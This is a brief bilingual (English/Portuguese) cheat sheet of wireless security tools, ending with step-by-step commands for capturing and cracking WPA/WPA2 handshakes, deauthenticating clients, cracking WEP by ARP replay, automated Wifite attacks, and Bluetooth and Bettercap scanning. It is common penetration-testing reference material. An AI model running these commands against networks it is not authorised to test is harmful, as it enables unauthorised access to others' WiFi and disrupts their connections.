 Wireless Security Tools

 WiFi Reconnaissance

 Aircrack-ng Suite
- airmon-ng: Monitor mode management
- airodump-ng: Packet capture and analysis
- aireplay-ng: Packet injection
- aircrack-ng: WEP/WPA cracking

 Kismet
- Wireless Network Detector: Detecção de redes wireless
- Packet Sniffer: Captura de pacotes
- Intrusion Detection: Detecção de intrusões

 Wifite
- Automated WiFi Auditing: Auditoria automática
- WEP/WPA/WPS Attacks: Ataques automatizados

 Bluetooth Security

 Bluez Tools
- hcitool: Bluetooth device scanning
- bluetoothctl: Bluetooth management
- l2ping: Bluetooth ping

 Bettercap
- Bluetooth Attacks: Ataques Bluetooth
- BLE Attacks: Bluetooth Low Energy

 WiFi Attacks

 WEP Attacks
- Fragmentation Attack: Ataque de fragmentação
- Chopped Attack: Ataque chopchop
- ARP Replay: Replay de ARP

 WPA/WPA2 Attacks
- Dictionary Attack: Ataque de dicionário
- Handshake Capture: Captura de handshake
- PMKID Attack: Ataque PMKID

 WPS Attacks
- Pixie Dust: Ataque Pixie Dust
- PIN Brute Force: Força bruta de PIN
- Reaver: Ferramenta WPS

 Wireless Monitoring

 Wireshark
- Packet Analysis: Análise de pacotes
- Protocol Dissection: Dissecação de protocolos
- Traffic Analysis: Análise de tráfego

 Horst
- Lightweight Monitor: Monitor leve
- Real-time Analysis: Análise em tempo real

 Scripts Úteis

 Aircrack-ng workflow
 1. Ativar monitor mode
airmon-ng start wlan0

 2. Descobrir redes
airodump-ng wlan0mon

 3. Capturar handshake
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

 4. Deauth attack (noutra terminal)
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

 5. Crack WPA/WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

 Wifite automated attack
wifite --wpa --dict /usr/share/wordlists/rockyou.txt

 WEP cracking
 1. Capture packets
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep wlan0mon

 2. ARP replay attack
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h CLIENT_MAC wlan0mon

 3. Crack WEP
aircrack-ng wep-01.cap

 Bluetooth scanning
hcitool scan
bluetoothctl
scan on
pair MAC_ADDRESS

 Bettercap
bettercap -iface wlan0mon
wifi.recon on
wifi.show